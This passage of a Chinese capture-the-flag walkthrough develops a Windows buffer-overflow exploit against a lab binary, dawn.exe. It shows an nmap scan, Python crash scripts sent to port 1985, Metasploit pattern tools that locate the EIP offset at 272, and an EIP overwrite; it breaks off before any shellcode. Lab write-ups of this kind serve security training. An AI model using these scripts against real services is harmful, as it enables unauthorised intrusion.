&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ &lt;span style="color:#658b00">export&lt;/span> &lt;span style="color:#00688b">rip&lt;/span>=10.0.2.7
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ sudo nmap -v -A -p- &lt;span style="color:#00688b">$rip&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Scanning localhost (10.0.2.7) [&lt;span style="color:#b452cd">65535&lt;/span> ports]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Discovered open port 80/tcp on 10.0.2.7
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Discovered open port 1985/tcp on 10.0.2.7
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Discovered open port 1435/tcp on 10.0.2.7
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>PORT STATE SERVICE VERSION
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>80/tcp open http Apache httpd 2.4.38 ((Debian))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| http-methods:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_ Supported Methods: POST OPTIONS HEAD GET
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-title: Site doesn&lt;span style="color:#a61717;background-color:#e3d2d2">&amp;#39;&lt;/span>t have a title (text/html).
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-server-header: Apache/2.4.38 (Debian)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>1435/tcp open ibm-cics?
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>1985/tcp open hsrp?
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#b452cd">2&lt;/span> services unrecognized despite returning data.
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/424/1.webp" alt="1">&lt;/p>
&lt;p>80端口发现可以下载个压缩包dawn.zip，解压发现dawn.exe&lt;/p>
&lt;p>1435端口和10985端口通过nc连接后，均无回显，猜测是dawn.exe运行在这两个端口之一。&lt;/p>
&lt;p>这个靶机应该是考windows缓冲区溢出的。而且，这个dawn.exe大概率是linux环境通过wine运行的。&lt;/p>
&lt;h3 id="漏洞发现">漏洞发现&lt;/h3>
&lt;p>把dawn.exe复制到windows调试机，运行后，发现可输入一些字符。&lt;/p>
&lt;div class="highlight">&lt;div style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cmd" data-lang="cmd">&lt;span style="display:flex;">&lt;span>C:\Users\John&lt;span style="color:#228b22">&amp;gt;tasklist|findstr dawn&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>dawn.exe 2800 Console 1 2,232 K
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>C:\Users\John&lt;span style="color:#228b22">&amp;gt;netstat -ano|findstr 2800&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> TCP 0.0.0.0:1985 0.0.0.0:0 LISTENING 2800
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>由此判定靶机1985端口运行的大概率是dawn.exe&lt;/p>
&lt;p>使用脚本进行调试&lt;/p>
&lt;div class="highlight">&lt;div style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#228b22">#!/usr/bin/python2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8b008b;font-weight:bold">import&lt;/span> &lt;span style="color:#008b45;text-decoration:underline">socket&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8b008b;font-weight:bold">import&lt;/span> &lt;span style="color:#008b45;text-decoration:underline">sys&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8b008b;font-weight:bold">import&lt;/span> &lt;span style="color:#008b45;text-decoration:underline">os&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip = &lt;span style="color:#cd5555">&amp;#34;10.0.2.14&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>port = &lt;span style="color:#b452cd">1985&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>buff = &lt;span style="color:#cd5555">&amp;#34;A&amp;#34;&lt;/span> * &lt;span style="color:#b452cd">300&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>nullByte = &lt;span style="color:#cd5555">&amp;#34;&lt;/span>&lt;span style="color:#cd5555">\x00&lt;/span>&lt;span style="color:#cd5555">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>inputBuffer = buff + nullByte
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>s.connect((ip, port))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>s.send(inputBuffer)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>s.close()
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/424/2.webp" alt="2">&lt;/p>
&lt;p>运行后，dawn.exe 停止工作，说明存在缓冲区溢出漏洞。&lt;/p>
&lt;h2 id="获得权限">获得权限&lt;/h2>
&lt;h3 id="本地测试">本地测试&lt;/h3>
&lt;p>继续测试&lt;/p>
&lt;p>使用Immunity Debugger 打开dawn.exe并运行&lt;/p>
&lt;p>使用msf-pattern_create生成字符串&lt;/p>
&lt;div class="highlight">&lt;div style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ msf-pattern_create -l &lt;span style="color:#b452cd">300&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h4 id="确定位置">📌确定位置&lt;/h4>
&lt;div class="highlight">&lt;div style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#228b22">#!/usr/bin/python2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8b008b;font-weight:bold">import&lt;/span> &lt;span style="color:#008b45;text-decoration:underline">socket&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8b008b;font-weight:bold">import&lt;/span> &lt;span style="color:#008b45;text-decoration:underline">sys&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8b008b;font-weight:bold">import&lt;/span> &lt;span style="color:#008b45;text-decoration:underline">os&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip = &lt;span style="color:#cd5555">&amp;#34;10.0.2.14&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>port = &lt;span style="color:#b452cd">1985&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>buff = &lt;span style="color:#cd5555">&amp;#34;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>nullByte = &lt;span style="color:#cd5555">&amp;#34;&lt;/span>&lt;span style="color:#cd5555">\x00&lt;/span>&lt;span style="color:#cd5555">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>inputBuffer = buff + nullByte
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>s.connect((ip, port))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>s.send(inputBuffer)
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/424/3.webp" alt="3">&lt;/p>
&lt;p>运行后看到进程暂停，EIP为&lt;code>316A4130&lt;/code>&lt;/p>
&lt;p>使用msf-pattern_offset定位&lt;/p>
&lt;div class="highlight">&lt;div style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ msf-pattern_offset -l &lt;span style="color:#b452cd">300&lt;/span> -q 316A4130
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>[*] Exact match at offset &lt;span style="color:#b452cd">272&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/424/4.webp" alt="4">&lt;/p>
&lt;p>再次使用Immunity Debugger 打开dawn.exe并运行&lt;/p>
&lt;div class="highlight">&lt;div style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#228b22">#!/usr/bin/python2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8b008b;font-weight:bold">import&lt;/span> &lt;span style="color:#008b45;text-decoration:underline">socket&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8b008b;font-weight:bold">import&lt;/span> &lt;span style="color:#008b45;text-decoration:underline">sys&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8b008b;font-weight:bold">import&lt;/span> &lt;span style="color:#008b45;text-decoration:underline">os&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip = &lt;span style="color:#cd5555">&amp;#34;10.0.2.14&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>port = &lt;span style="color:#b452cd">1985&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>buff = &lt;span style="color:#cd5555">&amp;#34;A&amp;#34;&lt;/span>*&lt;span style="color:#b452cd">272&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>eip = &lt;span style="color:#cd5555">&amp;#34;B&amp;#34;&lt;/span> * &lt;span style="color:#b452cd">4&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>buffer = &lt;span style="color:#cd5555">&amp;#34;C&amp;#34;&lt;/span> * &lt;span style="color:#b452cd">24&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>nullByte = &lt;span style="color:#cd5555">&amp;#34;&lt;/span>&lt;span style="color:#cd5555">\x00&lt;/span>&lt;span style="color:#cd5555">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>inputBuffer = buff + eip + buffer + nullByte
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>s.connect((ip, port))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>s.send(inputBuffer)
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/424/5.webp" alt="5">&lt;/p>
&lt;p>EIP写入成功&lt;/p>
&lt;p>shellcode长度一般需要500，加上前期测试的300，共800长度。&lt;/p>
&lt;div class="highlight">&lt;div style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#228b22">#!/usr/bin/python2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8b008b;font-weight:bold">import&lt;/span> &lt;span style="color:#008b45;text-decoration:underline">socket&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8b008b;font-weight:bold">import&lt;/span> &lt;span style="color:#008b45;text-decoration:underline">sys&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8b008b;font-weight:bold">import&lt;/span> &lt;span style="color:#008b45;text-decoration:underline">os&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip = &lt;span style="color:#cd5555">&amp;#34;10.0.2.14&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>port = &lt;span style="color:#b452cd">1985&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>buff = &lt;span style="color:#cd5555">&amp;#34;A&amp;#34;&lt;/span>*&lt;span style="color:#b452cd">272&lt;/span>
